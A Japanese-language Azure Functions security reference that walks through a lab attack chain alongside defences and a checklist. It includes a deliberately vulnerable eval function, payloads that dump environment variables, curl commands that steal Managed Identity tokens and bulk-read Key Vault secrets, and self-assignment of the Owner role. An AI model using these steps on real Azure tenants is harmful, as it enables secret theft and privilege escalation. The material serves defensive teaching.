# Azure Functions セキュリティリファレンス

## 概要

Azure Functions環境における攻撃パターンと防御戦略を、攻防両面から解説する。コード注入、SSRF、過剰権限Managed Identity、Key Vault窃取、権限昇格の実例を含む。

---

## Azure Functions の脅威

### 主な攻撃ベクトル

- **コード注入**: `eval()` 等の危険な関数による任意コード実行
- **SSRF (Server-Side Request Forgery)**: 内部リソースへの不正アクセス
- **過剰権限Managed Identity**: 最小権限原則違反による権限昇格
- **Key Vault窃取**: アクセストークン窃取によるシークレット流出
- **環境変数窃取**: ハードコードされた認証情報・API キーの流出

### Azure関連用語

| 用語 | 説明 |
|------|------|
| **Function App** | 1つ以上のAzure Functionsをホストするコンテナ（実行環境・スケーリング・ネットワーク設定を含む） |
| **Managed Identity** | コード内に認証情報を保存せずにAzureサービスを認証できるID（AWS IAM Roleに相当） |
| **Resource Group** | Azure リソースを論理的にまとめるコンテナ（まとめて管理・更新・削除可能） |
| **Function Key** | Azure Function呼び出しを認証・認可するシークレットトークン |
| **Storage Account** | Blob、ファイル、キュー、テーブル、ディスク等のクラウドストレージを提供 |
| **RBAC (Role-Based Access Control)** | Azureロールベースアクセス制御（権限管理） |
| **Principal** | ユーザー、グループ、Managed Identityなどロールを割り当て可能なセキュリティエンティティ |
| **Scope** | ロール割り当てが適用されるリソースの範囲（リソース、リソースグループ、サブスクリプション） |

---

## 攻撃シナリオ1: コード注入による環境変数窃取

### 脆弱なコード例

```javascript
// 危険: 動的コード実行による任意コード評価
const { app } = require('@azure/functions');
const HARDCODED_KEY = "67890ghijkl";

app.http('evaluate', {
  methods: ['POST'],
  authLevel: 'function',
  handler: async (request, context) => {
    const expression = await request.text() || '"No expression provided"';
    let result;
    try {
      // 脆弱性: 未検証入力を動的実行するパターン
      result = dangerousEval(expression);
    } catch (err) {
      result = `Error: ${err.message}`;
    }
    return { body: `Evaluation result: ${result}` };
  }
});
```

### 攻撃ペイロード例

```javascript
// 【警告】以下は攻撃パターンの説明目的。実装では使用しないこと

// ファイル一覧取得
require('fs').readdirSync('./')

// ソースコード読み込み
require('fs').readFileSync('./src/functions/evaluate.js', 'utf8')

// 環境変数窃取
JSON.stringify(process.env)

// 特定環境変数取得
JSON.stringify(process.env.SAMPLE_API_KEY)
```

### 防御策

```javascript
// 安全: 動的コード実行を使用しない
// - 入力検証とサニタイゼーション
// - math.js等の専用ライブラリを使用
// - サンドボックス化された実行環境

const math = require('mathjs');

app.http('evaluate', {
  methods: ['POST'],
  authLevel: 'function',
  handler: async (request, context) => {
    const expression = await request.text() || '0';
    let result;
    try {
      // 安全: math.evaluate() は数式のみ評価
      result = math.evaluate(expression);
    } catch (err) {
      result = `Error: Invalid expression`;
    }
    return { body: `Result: ${result}` };
  }
});
```

---

## Azure Key Vault でのシークレット管理

### Key Vault へのシークレット保存

```bash
# Key Vault作成
az keyvault create \
  --name $KEYVAULT_NAME \
  --resource-group $RESOURCE_GROUP \
  --location $LOCATION \
  --sku standard

# RBAC有効化確認
az keyvault show --name $KEYVAULT_NAME \
  --query properties.enableRbacAuthorization

# ユーザーにKey Vault Secrets Officer ロール付与
az role assignment create \
  --role "Key Vault Secrets Officer" \
  --assignee $USER_UPN \
  --scope $SCOPE

# シークレット作成
az keyvault secret set \
  --vault-name $KEYVAULT_NAME \
  --name "secret00" \
  --value "SECRETABC123"
```

### Managed Identity 設定

```bash
# System-assigned Managed Identity 有効化
az functionapp identity assign \
  --name $FUNCTION_APP \
  --resource-group $RESOURCE_GROUP

# Principal ID 取得
PRINCIPAL_ID=$(az functionapp identity show \
  --name $FUNCTION_APP \
  --resource-group $RESOURCE_GROUP \
  | jq -r ".principalId")

# Key Vault Secrets Officer ロールをManaged Identityに付与
az role assignment create \
  --role "Key Vault Secrets Officer" \
  --assignee $PRINCIPAL_ID \
  --scope $SCOPE_KV

# Function AppにKey Vault名を環境変数として設定
az functionapp config appsettings set \
  --name $FUNCTION_APP \
  --resource-group $RESOURCE_GROUP \
  --settings KEYVAULT_NAME=$KEYVAULT_NAME
```

### Function からKey Vault アクセス

```javascript
const { DefaultAzureCredential } = require("@azure/identity");
const { SecretClient } = require("@azure/keyvault-secrets");

const KEY_VAULT_NAME = process.env.KEYVAULT_NAME;
const KV_URL = `https://${KEY_VAULT_NAME}.vault.azure.net`;

const credential = new DefaultAzureCredential();
const client = new SecretClient(KV_URL, credential);

const secrets = {};
(async () => {
  for (const name of SECRET_NAMES) {
    try {
      const secret = await client.getSecret(name);
      secrets[name] = secret.value;
    } catch (err) {
      console.error(`Failed to fetch secret ${name}: ${err.message}`);
      secrets[name] = null;
    }
  }
})();
```

---

## 攻撃シナリオ2: 過剰権限Managed Identityによる権限昇格（概要）

コード注入脆弱性と過剰権限Managed Identityを組み合わせた攻撃の流れ：

1. コード注入で `IDENTITY_ENDPOINT` / `IDENTITY_HEADER` 環境変数を取得
2. MSIエンドポイントからManagement PlaneトークンとData Planeトークンを窃取
3. User Access Administrator権限でOwnerロールを自己付与（権限昇格）
4. Key Vault Secrets Officerロールを付与してシークレットを取得

詳細な実装と認可エラーパターンは「攻撃シナリオ3・4」を参照。

---

## 最小権限の適用（防御）

### 危険なロール組み合わせ

| ロール | 権限 | リスク |
|--------|------|--------|
| **Owner** | サブスクリプション全体の完全制御 | すべてのリソースへのフルアクセス |
| **User Access Administrator** | ロール割り当て変更 | 自己に任意のロールを付与可能 → 権限昇格 |
| **Contributor** | リソース作成・変更・削除 | ロール割り当て以外のすべての操作 |
| **Key Vault Secrets Officer** | Key Vaultシークレット完全制御 | シークレット読み書き削除 |

### 過剰権限の削除

```bash
# 現在のロール割り当て確認
az role assignment list \
  --assignee $PRINCIPAL_ID \
  --all \
  -o table

# ロール割り当て削除
az role assignment delete \
  --assignee "$PRINCIPAL_ID" \
  --role "Owner" \
  --scope "/subscriptions/$SUBSCRIPTION_ID"

az role assignment delete \
  --assignee "$PRINCIPAL_ID" \
  --role "User Access Administrator" \
  --scope "/subscriptions/$SUBSCRIPTION_ID"

az role assignment delete \
  --assignee "$PRINCIPAL_ID" \
  --role "Contributor" \
  --scope "/subscriptions/$SUBSCRIPTION_ID"

az role assignment delete \
  --assignee "$PRINCIPAL_ID" \
  --role "Key Vault Secrets Officer" \
  --scope "$SCOPE_KV"
```

### 必要最小限のロール設計

```bash
# 推奨: Key Vault読み取りのみ必要な場合
az role assignment create \
  --role "Key Vault Secrets User" \
  --assignee $PRINCIPAL_ID \
  --scope "$SCOPE_KV"

# 推奨: 特定リソースグループのみ
az role assignment create \
  --role "Reader" \
  --assignee $PRINCIPAL_ID \
  --scope "/subscriptions/$SUBSCRIPTION_ID/resourceGroups/$RESOURCE_GROUP"
```

---

## Azure Functions 環境構築（CLI ステップバイステップ）

### リソース作成シーケンス

```bash
# ランダムサフィックスで一意なリソース名を生成
RAND=$RANDOM
RESOURCE_GROUP=rg-serverless-security-lab
STORAGE_ACCOUNT=storageaccount$RAND
FUNCTION_APP=functionapp$RAND
LOCATION=eastus

# Resource Group → Storage Account → Function App の順に作成
az group create --name $RESOURCE_GROUP --location $LOCATION

az storage account create \
  --name $STORAGE_ACCOUNT --location $LOCATION \
  --resource-group $RESOURCE_GROUP --sku Standard_LRS

az functionapp create \
  --resource-group $RESOURCE_GROUP \
  --consumption-plan-location $LOCATION \
  --runtime node --runtime-version 22 --functions-version 4 \
  --name $FUNCTION_APP --storage-account $STORAGE_ACCOUNT

# Node.jsプロジェクト初期化 → HTTPトリガー生成 → デプロイ
func init --worker-runtime node --language javascript
func new --name evaluate --template "HTTP trigger" --authlevel "function"
func azure functionapp publish $FUNCTION_APP
```

### Function Key の取得と動作確認

```bash
# Function Key取得
FUNCTION_KEY=$(az functionapp function keys list \
  --resource-group $RESOURCE_GROUP --name $FUNCTION_APP \
  --function-name evaluate | jq -r ".default")

# 動作確認
curl -X POST "$INVOKE_URL?code=$FUNCTION_KEY" \
  -H "Content-Type: text/plain" -d "2+2"
# 出力: Evaluation result: 4
```

---

## セキュリティテスト自動化スクリプト

### REPLスクリプト（tester.rb）

ペイロードの繰り返し送信を自動化するスクリプト。セキュリティテスト時に `curl` コマンドの反復入力を省略し、対話的に各種ペイロードを試験できる。

```ruby
# tester.rb - Azure Function のセキュリティテスト用 REPL スクリプト
require 'net/http'; require 'uri'; require 'json'
INVOKE_URL = ENV['INVOKE_URL']; FUNCTION_KEY = ENV['FUNCTION_KEY']
uri = URI.parse("#{INVOKE_URL}?code=#{FUNCTION_KEY}")

loop do
  print "Enter payload (or 'exit'): "
  input = gets.strip
  break if input.downcase == 'exit'
  req = Net::HTTP::Post.new(uri)
  req['Content-Type'] = 'text/plain'
  req.body = input
  res = Net::HTTP.start(uri.hostname, uri.port, use_ssl: true) { |h| h.request(req) }
  body = res.body.sub("Evaluation result:", "").strip
  begin; puts JSON.pretty_generate(JSON.parse(body))
  rescue; puts body; end
end
```

```bash
# 実行方法
export INVOKE_URL="[Invoke URL]"
export FUNCTION_KEY="[Function Key]"
ruby tester.rb
```

---

## 攻撃シナリオ3: Key Vaultトークン段階的窃取

### Management Plane vs Data Plane トークンの詳細

2種類のアクセストークンが必要であることを理解することが重要。トークンの `resource` (audience) が用途を決定する。

| トークン種別 | resource (audience) | 用途 | 使用API |
|-------------|---------------------|------|---------|
| Management Plane | `https://management.azure.com/` | リソース管理（Key Vault一覧取得、ロール操作等） | ARM REST API |
| Data Plane (Key Vault) | `https://vault.azure.net/` | Key Vaultシークレットの読み書き | Key Vault REST API |

### コード注入によるトークン窃取の仕組み

動的コード実行脆弱性を持つ関数では、攻撃者は `process.env.IDENTITY_ENDPOINT` / `process.env.IDENTITY_HEADER` 環境変数を利用してMSIエンドポイントからManaged Identityのトークンを窃取できる。

```bash
# Management Plane トークン取得（resource 指定でトークンの対象オーディエンスを決定）
curl -s -H "X-IDENTITY-HEADER: ${IDENTITY_HEADER}" \
  "${IDENTITY_ENDPOINT}?resource=https://management.azure.com/&api-version=2019-08-01"
# 出力: { "access_token": "...", "resource": "https://management.azure.com/", ... }

# Key Vault Data Plane トークン取得
curl -s -H "X-IDENTITY-HEADER: ${IDENTITY_HEADER}" \
  "${IDENTITY_ENDPOINT}?resource=https://vault.azure.net/&api-version=2019-08-01"
# 出力: { "access_token": "...", "resource": "https://vault.azure.net/", ... }
```

### 認可エラーの発生パターン（失敗シナリオ）

Management PlaneトークンでKey Vaultシークレットにアクセスしようとすると失敗する:

```bash
# NG: Management PlaneトークンでData Plane操作を試みる
# （ACCESS_TOKEN が management.azure.com 向けのトークン）
curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
  "https://${KEYVAULT_NAME}.vault.azure.net/secrets?api-version=7.5"
# エラー: { "error": { "code": "Unauthorized",
#   "message": "AKV10022: Invalid audience. Expected vault.azure.net, found: management.azure.com" } }

# OK: Data PlaneトークンでKey Vaultシークレットにアクセス
# （ACCESS_TOKEN_2 が vault.azure.net 向けのトークン）
curl -s -H "Authorization: Bearer $ACCESS_TOKEN_2" \
  "https://${KEYVAULT_NAME}.vault.azure.net/secrets?api-version=7.5"
```

### Key Vault発見とシークレット一括取得

```bash
# Management APIでKey Vault一覧を発見
URL="https://management.azure.com/subscriptions/$SUBSCRIPTION_ID/providers/Microsoft.KeyVault/vaults?api-version=2022-07-01"
RESPONSE=$(curl -s -H "Authorization: Bearer $ACCESS_TOKEN" "$URL")
KEYVAULT_NAME=$(echo $RESPONSE | jq -r ".value.[].name")

# Data PlaneトークンでKey Vaultシークレット一括取得
SECRETS_RESPONSE=$(curl -s -H "Authorization: Bearer $ACCESS_TOKEN_2" \
  "https://${KEYVAULT_NAME}.vault.azure.net/secrets?api-version=7.5")

for SECRET_ID in $(echo "$SECRETS_RESPONSE" | jq -r '.value[].id'); do
  curl -s -H "Authorization: Bearer $ACCESS_TOKEN_2" \
    "${SECRET_ID}?api-version=7.5" | jq '{name: .id, value: .value}'
done
# 出力例:
# { "name": "https://keyvault.../secrets/secret00/...", "value": "SECRETABC123" }
# { "name": "https://keyvault.../secrets/secret01/...", "value": "SECRETDEF456" }
```

---

## 攻撃シナリオ4: Contributor + User Access Administrator からの権限昇格

### ロール組み合わせによる昇格経路

`Contributor` だけでは権限昇格できないが、`User Access Administrator` と組み合わせると自己にOwnerロールを付与できる。

```bash
# JWTトークンのデコードでOID（Principal ID）を抽出
echo $ACCESS_TOKEN | cut -d "." -f2 | base64 --decode | jq .
# base64デコードエラーが発生する場合の代替方法（URLセーフBase64対応）:
PAYLOAD=$(echo $ACCESS_TOKEN | cut -d "." -f2)
FIXED=$(echo "$PAYLOAD" | tr '_-' '/+' | \
  awk '{printf "%s%s", $0, substr("===", (length($0)%4)+1)}')
echo "$FIXED" | base64 --decode 2>/dev/null | jq -r '.oid'

# JWTの主要クレーム:
# aud: トークンの対象オーディエンス
# oid: オブジェクトID（Principal ID） <- 権限昇格で使用
# xms_mirid: Managed Identityのリソースパス
```

```bash
# Ownerロール定義IDの取得と自己付与（User Access Administrator 権限で実行可能）
OWNER_ROLE_ID=$(az role definition list --name "Owner" --query "[].id" -o tsv)
ROLE_ASSIGNMENT_ID=$(uuidgen)
URL="https://management.azure.com/subscriptions/$SUBSCRIPTION_ID/providers/Microsoft.Authorization/roleAssignments/$ROLE_ASSIGNMENT_ID?api-version=2022-04-01"

curl -X PUT "$URL" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"properties\": {\"roleDefinitionId\": \"$OWNER_ROLE_ID\", \"principalId\": \"$PRINCIPAL_ID\"}}"

# Key Vault Secrets Officerロールの追加（Data Plane アクセス用）
# OwnerロールはControl Planeのみ。Key Vaultシークレット操作には別途Data Planeロールが必要
ROLE_DEFINITION_ID=$(az role definition list --name "Key Vault Secrets Officer" -o json | jq -r '.[0].id')
ROLE_ASSIGNMENT_ID=$(uuidgen)
URL="https://management.azure.com/subscriptions/$SUBSCRIPTION_ID/resourceGroups/$RESOURCE_GROUP/providers/Microsoft.KeyVault/vaults/$KEYVAULT_NAME/providers/Microsoft.Authorization/roleAssignments/$ROLE_ASSIGNMENT_ID?api-version=2022-04-01"

curl -X PUT "$URL" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"properties\": {\"roleDefinitionId\": \"$ROLE_DEFINITION_ID\", \"principalId\": \"$PRINCIPAL_ID\"}}"
```

### 最小権限適用後の検証（認可エラーパターン）

ロール削除後に同じ操作を試みると認可エラーが返ることを確認する（「過剰権限の削除」コマンドは上記「最小権限の適用」セクション参照）:

```bash
# 削除後の検証1: Key Vault一覧取得は AuthorizationFailed
# エラー: { "code": "AuthorizationFailed", "message": "... does not have authorization ..." }

# 削除後の検証2: シークレット取得は ForbiddenByRbac
curl -s -H "Authorization: Bearer $ACCESS_TOKEN_2" \
  "https://${KEYVAULT_NAME}.vault.azure.net/secrets?api-version=7.5"
# エラー: { "code": "Forbidden", "innererror": { "code": "ForbiddenByRbac" } }
```

---

## Azure セキュリティチェックリスト

### コード・設定

- [ ] **動的コード実行関数（eval、exec、spawn等）を使用しない**
- [ ] **入力検証とサニタイゼーション実装**
- [ ] **ハードコードされた認証情報を排除**
- [ ] **Key Vault でシークレット管理**
- [ ] **Function Key で認証レベル `function` 設定**

### Managed Identity

- [ ] **System-assigned Managed Identity 使用**
- [ ] **最小権限原則適用（Owner / User Access Administrator ロール付与禁止）**
- [ ] **スコープを必要最小限に制限（サブスクリプションレベル付与回避）**
- [ ] **定期的なロール割り当てレビュー**

### Key Vault

- [ ] **RBAC 有効化（レガシーアクセスポリシー無効化）**
- [ ] **Key Vault Secrets Officer ではなく Secrets User を優先**
- [ ] **ネットワークアクセス制限（Private Endpoint / Firewall）**
- [ ] **論理削除有効化（accidental deletion対策）**

### 監視・ログ

- [ ] **Azure Monitor / Application Insights 有効化**
- [ ] **コントロールプレーン操作監査（ロール割り当て変更検知）**
- [ ] **異常なKey Vaultアクセスパターン検知**
- [ ] **Managed Identity トークン使用状況監視**

### 開発・デプロイ

- [ ] **IaC（Infrastructure as Code）でロール割り当て管理**
- [ ] **開発環境で権限変更テスト**
- [ ] **本番環境へのデプロイ前にセキュリティレビュー実施**
- [ ] **自動化スクリプトによる一貫した権限設定**

---

## 参考資料

- [Microsoft Security Testing Rules of Engagement](https://learn.microsoft.com/azure/security/penetration-testing)
- [Azure RBAC Documentation](https://learn.microsoft.com/azure/role-based-access-control/)
- [Azure Key Vault Security](https://learn.microsoft.com/azure/key-vault/general/security-features)
- [Managed Identities for Azure Resources](https://learn.microsoft.com/azure/active-directory/managed-identities-azure-resources/)
